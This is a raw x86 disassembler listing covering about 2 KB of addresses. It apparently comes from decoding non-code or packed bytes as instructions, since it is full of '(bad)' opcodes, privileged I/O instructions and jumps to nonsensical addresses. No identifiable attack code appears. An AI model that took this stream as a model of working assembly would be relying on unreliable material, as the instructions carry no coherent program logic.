  41c1c9:	add    DWORD PTR [esi+0x510a240a],esp
  41c1cf:	adc    DWORD PTR [edi],0xffffffe1
  41c1d2:	addr16 push ds
  41c1d4:	add    BYTE PTR [edx+ecx*8],cl
  41c1d7:	clc    
  41c1d8:	sbb    DWORD PTR [eax+0x3d],ebp
  41c1db:	and    eax,0x8f47ab64
  41c1e0:	cs aad 0x63
  41c1e3:	popa   
  41c1e4:	imul   esp,edx,0x4b
  41c1e7:	pop    eax
  41c1e8:	sbb    DWORD PTR [ecx+0x1f0313de],edi
  41c1ee:	aas    
  41c1ef:	xchg   ebx,eax
  41c1f0:	pop    ebx
  41c1f1:	mov    ds:0xb472375f,al
  41c1f6:	fs mov ebx,0x68293a2c
  41c1fc:	fcmovb st,st(1)
  41c1fe:	inc    esp
  41c1ff:	imul   edi,esp,0xa86064e2
  41c205:	mov    bl,BYTE PTR [ebp+0x27016e7c]
  41c20b:	xchg   ebp,eax
  41c20c:	fnsave [esi+0x5d]
  41c20f:	xchg   edx,edi
  41c211:	sbb    al,0xc4
  41c213:	lahf   
  41c214:	mov    edx,0x61497fa0
  41c219:	cmp    ecx,DWORD PTR [esi+eiz*2]
  41c21c:	or     cl,dl
  41c21e:	and    ecx,DWORD PTR [edx+0x45]
  41c221:	push   ss
  41c222:	test   eax,0x9330c9e3
  41c227:	es pop ss
  41c229:	loopne 0x41c1e6
  41c22b:	mov    edi,0x2bd406bc
  41c230:	jge    0x41c225
  41c232:	lahf   
  41c233:	fwait
  41c234:	cdq    
  41c235:	adc    bh,BYTE PTR [edx]
  41c237:	push   edx
  41c238:	sbb    eax,0xffcce61
  41c23d:	xor    ax,0x1c55
  41c241:	add    BYTE PTR [edi-0x348e4198],ah
  41c247:	jp     0x41c2ba
  41c249:	dec    edi
  41c24a:	shl    DWORD PTR ss:[esp+eiz*8+0x6],1
  41c24f:	aas    
  41c250:	jae    0x41c2aa
  41c252:	pusha  
  41c253:	hlt    
  41c254:	nop
  41c255:	or     eax,0xf1312749
  41c25a:	clc    
  41c25b:	pop    ebp
  41c25c:	mov    eax,0x7f5a2649
  41c261:	fsubr  st,st(6)
  41c263:	imul   eax,DWORD PTR ds:0xf1590dfa,0x3b6b25e
  41c26d:	jg     0x41c288
  41c26f:	push   ds
  41c270:	mov    cl,ch
  41c272:	call   0x37321fe8
  41c277:	(bad)  
  41c278:	pop    edx
  41c279:	jno    0x41c291
  41c27b:	rol    BYTE PTR [edi+0x1d2d1a21],cl
  41c281:	adc    ah,BYTE PTR [eax]
  41c283:	xchg   ebx,eax
  41c284:	loopne 0x41c23f
  41c286:	push   0x77b87514
  41c28b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c28c:	jnp    0x41c2df
  41c28e:	rcl    BYTE PTR [eax+eax*4],cl
  41c291:	lahf   
  41c292:	dec    esi
  41c293:	int    0x85
  41c295:	addr16 mov esi,0x25e88d81
  41c29b:	adc    al,0x5
  41c29d:	add    ah,BYTE PTR [ebp+0x2a018910]
  41c2a3:	push   edi
  41c2a4:	push   ecx
  41c2a5:	hlt    
  41c2a6:	imul   esi,DWORD PTR ds:0xbb21791,0xffffffc2
  41c2ad:	arpl   WORD PTR [edx-0x56fd999e],bx
  41c2b3:	jmp    0xe20779cb
  41c2b8:	aas    
  41c2b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2ba:	fisubr DWORD PTR [esi]
  41c2bc:	stos   DWORD PTR es:[edi],eax
  41c2bd:	rcr    BYTE PTR [eax+0x3fcd4f66],0xa1
  41c2c4:	cmp    bl,BYTE PTR [esi+0x1f6c6af1]
  41c2ca:	mov    al,0xbd
  41c2cd:	call   0x60dcf751
  41c2d2:	out    0x8b,eax
  41c2d4:	arpl   WORD PTR [ecx],dx
  41c2d6:	pop    ebp
  41c2d7:	sbb    dl,ch
  41c2d9:	inc    esp
  41c2da:	mov    al,ds:0x7f788ba0
  41c2df:	mov    WORD PTR [edi+0x3bcd7029],cs
  41c2e5:	mov    edi,esp
  41c2e7:	adc    esp,DWORD PTR ds:0xb983c03c
  41c2ed:	scas   al,BYTE PTR es:[edi]
  41c2ee:	cmp    dl,BYTE PTR [esp+esi*8-0x5d]
  41c2f2:	adc    al,0x12
  41c2f4:	int    0xcb
  41c2f6:	and    dl,al
  41c2f8:	(bad)  
  41c2f9:	cmp    edx,ebx
  41c2fb:	xchg   ebp,eax
  41c2fc:	shr    al,cl
  41c2fe:	ins    DWORD PTR es:[edi],dx
  41c2ff:	repz pushf 
  41c301:	xor    al,0x8
  41c303:	aaa    
  41c304:	mov    ch,0xe5
  41c306:	sti    
  41c307:	inc    ebx
  41c308:	cmp    dh,BYTE PTR [ebx+0x58]
  41c30b:	aaa    
  41c30c:	mov    esi,0xad2b4e2b
  41c311:	and    al,0x3
  41c313:	dec    esi
  41c314:	jmp    0x41c2b3
  41c316:	inc    ecx
  41c317:	add    DWORD PTR [esi-0x51ceff06],ebx
  41c31d:	ss in  al,dx
  41c31f:	push   ss
  41c320:	xchg   ebp,eax
  41c321:	lods   eax,DWORD PTR ds:[esi]
  41c322:	sbb    al,0xab
  41c324:	daa    
  41c325:	out    0x2b,al
  41c327:	rcl    DWORD PTR [esi+0x64093af8],cl
  41c32d:	(bad)  
  41c32e:	xor    cl,cl
  41c330:	not    DWORD PTR [edx+0x24f4d343]
  41c336:	into   
  41c337:	lock retf 
  41c339:	mov    dh,ch
  41c33b:	cmp    ebp,DWORD PTR [eax]
  41c33d:	pop    ds
  41c33e:	cld    
  41c33f:	or     esi,DWORD PTR [ecx]
  41c341:	aam    0xf2
  41c343:	add    al,BYTE PTR [eax+0x59]
  41c346:	pop    eax
  41c347:	lods   eax,DWORD PTR ds:[esi]
  41c348:	rcr    BYTE PTR [ebx],1
  41c34a:	aas    
  41c34b:	add    ah,ch
  41c34d:	sub    edi,DWORD PTR [ecx+0x2b]
  41c350:	inc    edx
  41c351:	dec    ecx
  41c352:	stos   DWORD PTR es:[edi],eax
  41c353:	push   ds
  41c354:	mov    ah,0xa9
  41c356:	test   ebp,0xbbb2291a
  41c35c:	lea    esp,[edx+0xe]
  41c35f:	dec    esp
  41c360:	ins    BYTE PTR es:[edi],dx
  41c361:	push   edi
  41c362:	xlat   BYTE PTR ds:[ebx]
  41c363:	sbb    ebx,ecx
  41c365:	mov    ah,0xd4
  41c367:	and    eax,0x3c15ba47
  41c36c:	call   0xd50b58a4
  41c371:	test   al,0x6f
  41c373:	nop
  41c374:	test   DWORD PTR ds:0x9a3ba4ee,ecx
  41c37a:	adc    al,0xf7
  41c37c:	pop    ss
  41c37d:	sbb    DWORD PTR [eax-0x5a],ebp
  41c380:	jbe    0x41c3d7
  41c382:	sbb    DWORD PTR [edi+eiz*2],eax
  41c385:	jno    0x41c401
  41c387:	push   cs
  41c388:	popf   
  41c389:	ret    
  41c38a:	mov    ds:0xf78efe46,eax
  41c38f:	dec    ebp
  41c390:	imul   ebx,DWORD PTR [esi],0xffffffb5
  41c393:	mov    ch,0x2b
  41c395:	fdiv   QWORD PTR [ebx]
  41c397:	mov    cl,0x9c
  41c399:	lds    edx,FWORD PTR [edx+0x6918115e]
  41c39f:	dec    edx
  41c3a0:	cmp    al,0xb4
  41c3a2:	mov    ebp,0xe5421880
  41c3a7:	jle    0x41c35c
  41c3a9:	cmp    DWORD PTR [ebx+ebx*4+0x1d83ddc8],0x6301bae4
  41c3b4:	fs push ds
  41c3b6:	loop   0x41c368
  41c3b8:	imul   ecx,DWORD PTR [esi],0x6
  41c3bb:	xor    eax,0x4bd77726
  41c3c0:	mov    edx,0x5a00dfab
  41c3c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3c6:	in     al,dx
  41c3c7:	lods   al,BYTE PTR ds:[si]
  41c3c9:	rcr    DWORD PTR [ecx],1
  41c3cb:	ins    DWORD PTR es:[edi],dx
  41c3cc:	mov    ch,0x65
  41c3ce:	ret    0x3dea
  41c3d1:	ss dec eax
  41c3d3:	fstp   TBYTE PTR [ecx+0x46]
  41c3d6:	inc    esi
  41c3d7:	jle    0x41c455
  41c3d9:	sti    
  41c3da:	jge    0x41c3e5
  41c3dc:	push   es
  41c3dd:	mov    ds:0xe47d0892,eax
  41c3e2:	jmp    0xe258:0xf005c279
  41c3e9:	cld    
  41c3ea:	sbb    eax,0xdea9ef8b
  41c3ef:	or     ecx,DWORD PTR [edx+ebx*1]
  41c3f2:	mov    ebp,0xa137f7d9
  41c3f7:	stc    
  41c3f8:	mov    ecx,0xa051f6a6
  41c3fd:	les    ecx,FWORD PTR [edi+ebx*1-0x4]
  41c401:	stos   BYTE PTR es:[edi],al
  41c402:	xchg   ecx,eax
  41c403:	xor    edi,DWORD PTR [ebx+0x31]
  41c406:	stos   BYTE PTR es:[edi],al
  41c407:	jns    0x41c3de
  41c409:	mov    ecx,0xf148a9b3
  41c40e:	mov    ecx,0x3a3b3aa0
  41c413:	iret   
  41c414:	or     DWORD PTR [ebp-0x1d23908b],edi
  41c41a:	pop    edi
  41c41b:	repz in al,dx
  41c41d:	cmp    eax,0xa064acba
  41c422:	mov    ebx,0x135ab7fd
  41c427:	xchg   bl,bh
  41c429:	adc    edi,esi
  41c42b:	mov    WORD PTR [ecx],ds
  41c42d:	es fs jns 0x41c403
  41c431:	mov    BYTE PTR [esi],ch
  41c433:	popf   
  41c434:	test   DWORD PTR [edx],0x1aab60dc
  41c43a:	(bad)  
  41c43b:	cmp    esp,DWORD PTR [eax-0x2a7a11ae]
  41c441:	div    ecx
  41c443:	in     eax,dx
  41c444:	dec    ebx
  41c445:	push   ecx
  41c446:	hlt    
  41c447:	call   0x96a792a7
  41c44c:	hlt    
  41c44d:	adc    al,0xe8
  41c44f:	jle    0x41c454
  41c451:	or     al,0xdd
  41c453:	adc    DWORD PTR [edx],0x12466cc2
  41c459:	rol    DWORD PTR [esi+0x58dfe5a4],1
  41c45f:	inc    ebx
  41c460:	adc    BYTE PTR [esi*8-0x1f373b63],0x97
  41c468:	dec    edi
  41c469:	pop    esp
  41c46a:	imul   DWORD PTR [edx-0x72cfe7c4]
  41c470:	mov    cl,0xfc
  41c472:	push   cs
  41c473:	cs stc 
  41c475:	cdq    
  41c476:	fcomp  DWORD PTR [ebx]
  41c478:	(bad)  
  41c479:	push   ss
  41c47a:	inc    edi
  41c47b:	and    ebp,DWORD PTR [ebx+0x6a74c86b]
  41c481:	in     eax,dx
  41c482:	ins    DWORD PTR es:[edi],dx
  41c483:	ret    0x94e7
  41c486:	inc    edi
  41c487:	sbb    al,0xa4
  41c48a:	xlat   BYTE PTR ds:[ebx]
  41c48b:	dec    esp
  41c48c:	xor    DWORD PTR [edi],esp
  41c48e:	jo     0x41c497
  41c490:	imul   esi,DWORD PTR [ebx-0x56],0x55
  41c494:	cmc    
  41c495:	call   0x7039cb4b
  41c49a:	in     al,0xeb
  41c49c:	sub    BYTE PTR [ebx+0x47],bl
  41c49f:	xchg   ecx,eax
  41c4a0:	mov    esp,DWORD PTR [esi+0x57]
  41c4a3:	adc    edi,DWORD PTR [ecx+0x2d85745a]
  41c4a9:	sub    BYTE PTR [ebx],dl
  41c4ab:	dec    BYTE PTR [edi+ecx*8+0x28]
  41c4af:	clc    
  41c4b0:	ins    BYTE PTR es:[edi],dx
  41c4b1:	mov    edi,0x1652e567
  41c4b6:	inc    ecx
  41c4b7:	xadd   BYTE PTR [esi+edi*8+0x2557fed6],dh
  41c4bf:	add    al,0xf6
  41c4c1:	arpl   WORD PTR [edi+0x74],dx
  41c4c4:	fnstenv [ebp-0x654bf290]
  41c4ca:	and    DWORD PTR [eax+0x13],esp
  41c4cd:	sub    eax,0xbf3f54f9
  41c4d2:	mov    edi,0x81c77faf
  41c4d7:	push   edx
  41c4d8:	pop    esi
  41c4d9:	jp     0x41c45e
  41c4db:	xchg   DWORD PTR [edi+0x29],esp
  41c4de:	addr16 clc 
  41c4e0:	dec    esi
  41c4e1:	call   0x67f432a2
  41c4e6:	xchg   esi,edx
  41c4e8:	inc    edi
  41c4e9:	xlat   BYTE PTR ds:[ebx]
  41c4ea:	mov    esi,0x86262a72
  41c4ef:	jecxz  0x41c478
  41c4f1:	gs dec ecx
  41c4f3:	pop    ds
  41c4f4:	or     dh,al
  41c4f6:	xchg   esp,eax
  41c4f7:	xchg   ebp,eax
  41c4f8:	ret    0x45a2
  41c4fb:	push   esp
  41c4fc:	iret   
  41c4fd:	lock data16 (bad) 
  41c501:	daa    
  41c502:	fld    TBYTE PTR [edi-0x2]
  41c505:	mov    cl,0x70
  41c507:	ret    0x1289
  41c50a:	fucom  st(2)
  41c50c:	or     DWORD PTR [esi],edi
  41c50e:	lahf   
  41c50f:	dec    edi
  41c510:	adc    dh,ch
  41c512:	arpl   WORD PTR [esi],si
  41c514:	add    cl,BYTE PTR [eax]
  41c516:	sbb    al,0x49
  41c518:	test   al,0x3d
  41c51a:	loope  0x41c55f
  41c51c:	idiv   BYTE PTR [edx]
  41c51e:	fdivr  st(3),st
  41c520:	shl    BYTE PTR [edx+0x7da9302b],cl
  41c526:	jmp    0x41c56f
  41c528:	inc    ebx
  41c529:	pop    eax
  41c52a:	sbb    BYTE PTR ds:0xaf6a2066,bl
  41c530:	mov    dl,0xd1
  41c532:	jl     0x41c4ba
  41c534:	add    edi,DWORD PTR [edx]
  41c536:	dec    eax
  41c537:	test   DWORD PTR [ecx+0x3c],esp
  41c53a:	daa    
  41c53b:	scas   al,BYTE PTR es:[edi]
  41c53c:	cmp    cl,ch
  41c53e:	sub    eax,0x85f58786
  41c543:	popf   
  41c544:	mov    al,0x33
  41c546:	iret   
  41c547:	xlat   BYTE PTR ds:[ebx]
  41c548:	sub    al,0x63
  41c54a:	xchg   ebp,eax
  41c54b:	mov    ebx,DWORD PTR [esi]
  41c54d:	mov    ecx,0x2cada145
  41c552:	mov    ebp,0x9817ec87
  41c557:	repnz ficom WORD PTR [ebp-0x78]
  41c55b:	adc    esi,edi
  41c55d:	pop    edi
  41c55e:	je     0x41c58c
  41c560:	jmp    ecx
  41c562:	not    BYTE PTR [edi-0x2c87e97f]
  41c568:	jg     0x41c53a
  41c56a:	test   BYTE PTR [edx+ebp*4-0x5f],ch
  41c56e:	inc    esp
  41c56f:	es je  0x41c5e8
  41c572:	mov    ds:0x256baddc,eax
  41c577:	sub    ebp,DWORD PTR [esi]
  41c579:	mov    al,ds:0x55f72c61
  41c57e:	push   esi
  41c57f:	add    eax,0x720845f5
  41c584:	sbb    DWORD PTR [ebx+ebx*4-0x3bf8128c],ebp
  41c58b:	mov    dh,al
  41c58d:	push   eax
  41c58e:	dec    ebx
  41c58f:	js     0x41c532
  41c591:	pop    ecx
  41c592:	xchg   BYTE PTR [ebx-0x49],bl
  41c595:	jmp    0xa007:0x4b4abad1
  41c59c:	js     0x41c5ff
  41c59e:	mov    dh,bl
  41c5a0:	cld    
  41c5a1:	adc    dl,BYTE PTR [ebx+0x76]
  41c5a4:	mov    WORD PTR [esi+0x60],?
  41c5a7:	push   edi
  41c5a8:	xchg   ebp,eax
  41c5a9:	mov    al,ds:0xabc9b3f4
  41c5ae:	(bad)  
  41c5af:	jmp    DWORD PTR [edx+0x255eb1ac]
  41c5b5:	pop    eax
  41c5b6:	and    DWORD PTR [eax+0x38b0930f],esp
  41c5bc:	cli    
  41c5bd:	and    BYTE PTR [esi+0x42],ch
  41c5c0:	cld    
  41c5c1:	or     al,dh
  41c5c3:	xor    DWORD PTR [ebp+0x4f],edx
  41c5c6:	and    BYTE PTR [ecx+0x79badd40],0xf2
  41c5cd:	fiadd  WORD PTR [esi-0x37]
  41c5d0:	mov    al,0x98
  41c5d2:	out    dx,eax
  41c5d3:	cli    
  41c5d4:	lock xor bl,bl
  41c5d7:	in     al,0xb0
  41c5d9:	dec    edx
  41c5da:	pop    esp
  41c5db:	adc    eax,0xaa816253
  41c5e0:	mov    eax,ds:0x8ac0d0a1
  41c5e5:	in     al,dx
  41c5e6:	inc    ebx
  41c5e7:	int    0x95
  41c5e9:	int3   
  41c5ea:	fadd   st(6),st
  41c5ec:	inc    esi
  41c5ed:	in     al,0x19
  41c5ef:	popa   
  41c5f0:	mov    ds:0x464b2852,al
  41c5f5:	mov    edi,0x66531a3a
  41c5fa:	jae    0x41c586
  41c5fc:	lds    ebx,FWORD PTR [ecx+0x21]
  41c5ff:	xor    DWORD PTR [eax-0x31bc9bf5],0xffffffa9
  41c606:	sub    ecx,eax
  41c608:	push   eax
  41c609:	aas    
  41c60a:	rcl    DWORD PTR [ecx-0x5db0dbb0],1
  41c610:	(bad)  
  41c611:	out    dx,eax
  41c612:	add    BYTE PTR [ebx-0x2cdeef20],cl
  41c618:	rcl    BYTE PTR [eax-0x45082f25],cl
  41c61e:	aaa    
  41c61f:	aad    0xf3
  41c621:	leave  
  41c622:	sbb    eax,0x2bc8f80f
  41c627:	inc    esi
  41c628:	gs pop ds
  41c62a:	jmp    0x227fa597
  41c62f:	sub    BYTE PTR [ecx+0x70d4b919],0xcd
  41c636:	xor    esp,DWORD PTR [esi]
  41c638:	ss mov eax,0xb0036e04
  41c63e:	push   edi
  41c63f:	mov    ebp,0xaed01f57
  41c644:	jg     0x41c5df
  41c646:	aaa    
  41c647:	lahf   
  41c648:	xchg   cl,cl
  41c64a:	sahf   
  41c64b:	stos   DWORD PTR es:[edi],eax
  41c64c:	sub    al,bl
  41c64e:	out    dx,al
  41c64f:	jle    0x41c685
  41c651:	sub    eax,0x8d2d11e1
  41c656:	in     al,dx
  41c657:	loop   0x41c68e
  41c659:	cdq    
  41c65a:	push   fs
  41c65c:	or     BYTE PTR [ecx+0x3b],dl
  41c65f:	jmp    0x41c68e
  41c661:	sbb    esi,DWORD PTR [ecx]
  41c663:	dec    eax
  41c664:	fwait
  41c665:	jo     0x41c606
  41c667:	imul   ebp,DWORD PTR [edx-0x1c],0xffffffac
  41c66b:	xchg   ecx,eax
  41c66c:	adc    eax,0x9b7fac12
  41c671:	and    al,0x3e
  41c673:	or     BYTE PTR [ebx],dl
  41c675:	push   ebx
  41c676:	imul   eax,DWORD PTR [ecx],0xffffff93
  41c679:	pop    es
  41c67a:	shl    dh,1
  41c67c:	or     edi,DWORD PTR [edx+0x44116f23]
  41c682:	fdiv   DWORD PTR ds:0xeab127
  41c688:	pop    edi
  41c689:	push   ebx
  41c68a:	xchg   al,dl
  41c68c:	inc    edx
  41c68d:	repz call 0xf37e:0x4230
  41c694:	hlt    
  41c695:	push   esi
  41c696:	dec    edx
  41c697:	mov    al,ds:0xdf698225
  41c69c:	adc    al,0x3b
  41c69e:	pop    ss
  41c69f:	cmp    dl,BYTE PTR [ebx]
  41c6a1:	test   al,0xe4
  41c6a3:	neg    DWORD PTR [ebx-0x45]
  41c6a6:	outs   dx,DWORD PTR ds:[esi]
  41c6a7:	mov    BYTE PTR [ecx-0x46],bl
  41c6aa:	(bad)  
  41c6ab:	loopne 0x41c6d3
  41c6ad:	mov    bh,0xc6
  41c6af:	loop   0x41c657
  41c6b1:	popa   
  41c6b2:	sbb    DWORD PTR [ebx-0x69],esp
  41c6b5:	ficomp DWORD PTR [ebx+0x728e36d1]
  41c6bb:	fcmovb st,st(5)
  41c6bd:	je     0x41c6a6
  41c6bf:	sbb    eax,0xead24636
  41c6c4:	lods   al,BYTE PTR ds:[esi]
  41c6c5:	push   cs
  41c6c6:	push   ebx
  41c6c7:	and    eax,0xe437f9f9
  41c6cc:	jecxz  0x41c723
  41c6ce:	dec    ebx
  41c6cf:	xor    edi,DWORD PTR [ebx-0x78]
  41c6d2:	cs xchg esi,eax
  41c6d4:	stos   DWORD PTR es:[edi],eax
  41c6d5:	xor    ch,BYTE PTR [eax-0x29]
  41c6d8:	loop   0x41c713
  41c6da:	fiadd  DWORD PTR [eax]
  41c6dc:	(bad)
  41c6e1:	dec    edx
  41c6e2:	jmp    0x336a:0xd392e13f
  41c6e9:	dec    ecx
  41c6ea:	adc    BYTE PTR [ebp-0x277c5e69],bl
  41c6f0:	mov    fs,edx
  41c6f2:	enter  0x8fbc,0xe
  41c6f6:	xor    edx,ecx
  41c6f8:	cwde   
  41c6f9:	cmp    al,0xe2
  41c6fb:	adc    cl,ch
  41c6fd:	dec    esp
  41c6fe:	gs (bad) 
  41c700:	dec    esp
  41c701:	inc    ebx
  41c702:	cdq    
  41c703:	jmp    0x41c735
  41c705:	dec    esi
  41c706:	add    ah,bl
  41c708:	aad    0xdb
  41c70a:	adc    ebx,esp
  41c70c:	pop    eax
  41c70d:	mov    esp,DWORD PTR [edx+0x42a34805]
  41c713:	push   0xffffffd8
  41c715:	aad    0xef
  41c717:	pop    ss
  41c718:	mov    dl,BYTE PTR [eax+ebx*1-0x18]
  41c71c:	jae    0x41c78a
  41c71e:	test   eax,0xebf4d105
  41c723:	and    DWORD PTR [ebp-0x23],ebx
  41c726:	jp     0x41c795
  41c728:	pcmpgtw mm6,QWORD PTR [eax]
  41c72b:	mov    al,ds:0xa52abf95
  41c730:	push   0x6b2e5ba2
  41c735:	sub    al,0x7b
  41c737:	add    BYTE PTR [eax-0x73],dh
  41c73a:	adc    ebp,esp
  41c73c:	enter  0x1eda,0x7
  41c740:	gs ret 
  41c742:	cs pop edx
  41c744:	js     0x41c79c
  41c746:	fdiv   QWORD PTR [edi+0x74fa35ef]
  41c74c:	(bad)  
  41c74d:	xchg   ecx,eax
  41c74e:	xor    eax,DWORD PTR [eax+0x244e3673]
  41c754:	shl    BYTE PTR ds:0xd34591a7,1
  41c75a:	fldl2e 
  41c75c:	xchg   esi,eax
  41c75d:	xchg   esi,eax
  41c75e:	jmp    0xe7da9b21
  41c763:	(bad)
  41c766:	imul   ecx,DWORD PTR [edx-0x65],0x9
  41c76a:	dec    esi
  41c76b:	fsub   st,st(1)
  41c76d:	inc    ecx
  41c76e:	push   0x70
  41c770:	xchg   edx,eax
  41c771:	fcmovu st,st(3)
  41c773:	pop    esi
  41c774:	daa    
  41c775:	cmp    bh,BYTE PTR [esi]
  41c777:	adc    al,0x2c
  41c779:	repz mov al,ds:0x87541419
  41c77f:	les    ebx,FWORD PTR [edx]
  41c781:	and    ch,bh
  41c783:	pop    esi
  41c784:	ins    DWORD PTR es:[edi],dx
  41c785:	or     eax,0x5769ca8c
  41c78a:	add    DWORD PTR [eax+edi*4-0x6d],edi
  41c78e:	xor    BYTE PTR [edx-0x5fd7723f],dl
  41c794:	jo     0x41c788
  41c796:	mov    al,ds:0xe4dc24b1
  41c79b:	je     0x41c769
  41c79d:	add    DWORD PTR [edi-0x74],0x47
  41c7a1:	push   ecx
  41c7a2:	(bad)  
  41c7a3:	pop    edi
  41c7a4:	mov    DWORD PTR [edx+0x27],ecx
  41c7a7:	inc    ecx
  41c7a8:	adc    cl,BYTE PTR [ebp-0xe]
  41c7ab:	jp     0x41c7c3
  41c7ad:	pusha  
  41c7ae:	stos   DWORD PTR es:[edi],eax
  41c7af:	push   ss
  41c7b0:	jbe    0x41c7ef
  41c7b2:	test   BYTE PTR [esi+ebx*2+0x144dc34b],0x47
  41c7ba:	dec    eax
  41c7bb:	aad    0xf3
  41c7bd:	call   0x237d:0xb73e495a
  41c7c4:	fistp  QWORD PTR [edx+edx*2]
  41c7c7:	jo     0x41c828
  41c7c9:	mov    ebp,DWORD PTR [eax-0x81248d8]
  41c7cf:	or     BYTE PTR [esi-0x585f668a],bh
  41c7d5:	imul   ebx,ebp,0xffffffcb
  41c7d8:	sbb    eax,0xd3bf1473
  41c7dd:	and    ah,BYTE PTR [edi]
  41c7df:	pop    ebx
  41c7e0:	rcl    bl,0x2a
  41c7e3:	aam    0x39
  41c7e5:	scas   al,BYTE PTR es:[edi]
  41c7e6:	push   cs
  41c7e7:	(bad)  
  41c7e8:	mov    ecx,0x7c210a79
  41c7ed:	loop   0x41c80c
  41c7ef:	cmp    BYTE PTR [edx*2-0x207900d2],0x9f
  41c7f7:	loopne 0x41c86e
  41c7f9:	mov    ebx,0xccbf74c6
  41c7fe:	jge    0x41c85b
  41c800:	cdq    
  41c801:	and    dl,dl
  41c803:	cmp    DWORD PTR [esp+ecx*2],eax
  41c806:	call   0x99d792c6
  41c80b:	shl    DWORD PTR [ebx+eax*1-0x75],cl
  41c80f:	(bad)  
  41c810:	stc    
  41c811:	add    ebp,DWORD PTR [eax+0x31]
  41c814:	add    BYTE PTR [edi+edi*1],ch
  41c817:	mov    al,0xad
  41c819:	mov    al,al
  41c81b:	ret    
  41c81c:	jmp    0x30340a39
  41c821:	jmp    0x41c88b
  41c823:	and    esp,DWORD PTR [edi]
  41c825:	xchg   edi,eax
  41c826:	xor    esp,esp
  41c828:	xchg   esp,eax
  41c829:	test   BYTE PTR [esi+0x3626cd51],0x79
  41c830:	pop    ds
  41c831:	cld    
  41c832:	dec    ebp
  41c833:	xchg   ecx,eax
  41c834:	popf   
  41c835:	test   eax,0xde30ef9b
  41c83a:	push   ds
  41c83b:	and    al,0xf6
  41c83d:	lods   al,BYTE PTR ds:[esi]
  41c83e:	dec    ecx
  41c83f:	pop    esp
  41c840:	mov    eax,ds:0xeb17c127
  41c845:	scas   eax,DWORD PTR es:[edi]
  41c846:	int3   
  41c847:	bound  ebp,QWORD PTR [esi-0x56cb50fc]
  41c84d:	add    eax,0xc8a3b805
  41c852:	movq   mm6,mm1
  41c855:	mov    bl,0xb8
  41c857:	mov    cs,WORD PTR [ebx+eax*1-0x5897840f]
  41c85e:	lods   al,BYTE PTR ds:[esi]
  41c85f:	xchg   edx,eax
  41c860:	push   0x10
  41c862:	outs   dx,DWORD PTR ds:[esi]
  41c863:	sti    
  41c864:	pop    esi
  41c865:	mov    WORD PTR [esi*4+0x5cb895d],?
  41c86c:	mov    ah,cl
  41c86e:	repz fnstenv [edx-0x38]
  41c872:	sub    BYTE PTR [edi+0x4e],dh
  41c875:	aad    0x11
  41c877:	pop    ebp
  41c878:	sub    edx,DWORD PTR [ecx-0x7edfc5a7]
  41c87e:	out    0x5,al
  41c880:	rcr    DWORD PTR ds:0x34407d1d,0xc1
  41c887:	gs scas eax,DWORD PTR es:[edi]
  41c889:	jne    0x41c83f
  41c88b:	adc    al,0x6f
  41c88d:	pusha  
  41c88e:	add    eax,0x3f4a08ca
  41c893:	fild   WORD PTR [ecx+edx*2]
  41c896:	push   ds
  41c897:	mul    DWORD PTR [edx+eax*4+0x56b6b18f]
  41c89e:	sbb    BYTE PTR [edx],al
  41c8a0:	cmp    dl,BYTE PTR [eax+0x4d046207]
  41c8a6:	and    al,0x9f
  41c8a8:	dec    esp
  41c8a9:	xchg   ecx,eax
  41c8aa:	or     eax,0x4bf424f6
  41c8af:	jmp    0x8b49:0x53f3bb14
  41c8b6:	fbld   TBYTE PTR [eax-0x73]
  41c8b9:	cmp    esp,DWORD PTR [esi+ebp*1]
  41c8bc:	aad    0xe9
  41c8be:	pop    esp
  41c8bf:	ss call 0xd6ded3dd
  41c8c5:	jno    0x41c87a
  41c8c7:	(bad)  
  41c8c8:	js     0x41c88d
  41c8ca:	dec    eax
  41c8cb:	xchg   BYTE PTR [eax+0x73d09fec],bh
  41c8d1:	(bad)  
  41c8d2:	lea    edx,[eax-0x22]
  41c8d5:	jns    0x41c939
  41c8d7:	jp     0x41c8a5
  41c8d9:	adc    al,0xef
  41c8db:	mov    ds:0xb432480f,eax
  41c8e0:	enter  0xe1f6,0x18
  41c8e4:	stc    
  41c8e5:	push   esi
  41c8e6:	push   eax
  41c8e7:	stos   DWORD PTR es:[edi],eax
  41c8e8:	push   edi
  41c8e9:	add    al,ch
  41c8eb:	mov    ds:0x193c8c34,al
  41c8f0:	gs inc ebx
  41c8f2:	scas   al,BYTE PTR es:[edi]
  41c8f3:	xchg   ebx,eax
  41c8f4:	ret    0x4ce2
  41c8f7:	repz test eax,0xaabe112b
  41c8fd:	jmp    0x41c961
  41c8ff:	sbb    BYTE PTR [edi-0x14],bl
  41c902:	in     eax,dx
  41c903:	inc    eax
  41c904:	(bad)
  41c907:	xlat   BYTE PTR ds:[ebx]
  41c908:	ret    0x5511
  41c90b:	(bad)
  41c90e:	dec    esp
  41c90f:	popa   
  41c910:	jmp    FWORD PTR [ecx]
  41c912:	sbb    esp,DWORD PTR [ebx]
  41c914:	sbb    al,BYTE PTR [ebx-0x47c30c14]
  41c91a:	mov    ?,WORD PTR [ebx-0x47]
  41c91d:	pcmpgtw mm4,QWORD PTR [ebp+ebp*1+0x5f]
  41c922:	pop    ds
  41c923:	or     DWORD PTR [edx],0xd5adcadf
  41c929:	or     dh,dl
  41c92b:	in     al,0xe
  41c92d:	inc    edi
  41c92e:	(bad)  
  41c92f:	xchg   ebx,eax
  41c930:	out    dx,al
  41c931:	adc    cl,ch
  41c933:	daa    
  41c934:	dec    ecx
  41c935:	add    bl,BYTE PTR [eax]
  41c937:	jl     0x41c91c
  41c939:	cwde   
  41c93a:	push   edi
  41c93b:	or     al,0xa1
  41c93d:	clc    
  41c93e:	dec    edx
  41c93f:	push   0xffffffe7
  41c941:	popa   
  41c942:	jbe    0x41c9c2
  41c944:	dec    ecx
  41c945:	fcomp  QWORD PTR [edi+ebp*1]
  41c948:	jl     0x41c9a5
  41c94a:	gs or  eax,0xccf41a6b
  41c950:	test   al,0xe0
  41c952:	mov    eax,0x6eb6653a
  41c957:	(bad)  
  41c958:	repz fisttp WORD PTR [esi+0x7c026eb8]
  41c95f:	xchg   esp,eax
  41c960:	scas   al,BYTE PTR es:[edi]
  41c961:	arpl   WORD PTR [edi+0x61],sp
  41c964:	inc    edx
  41c965:	mov    al,0x2
  41c967:	ja     0x41c9c8
  41c969:	jecxz  0x41c8f0
  41c96b:	shl    al,cl
  41c96d:	jp     0x41c9ed
  41c96f:	imul   ebx,DWORD PTR [eax-0x1f65f425],0xfab3fcf2
  41c979:	add    ebx,edi
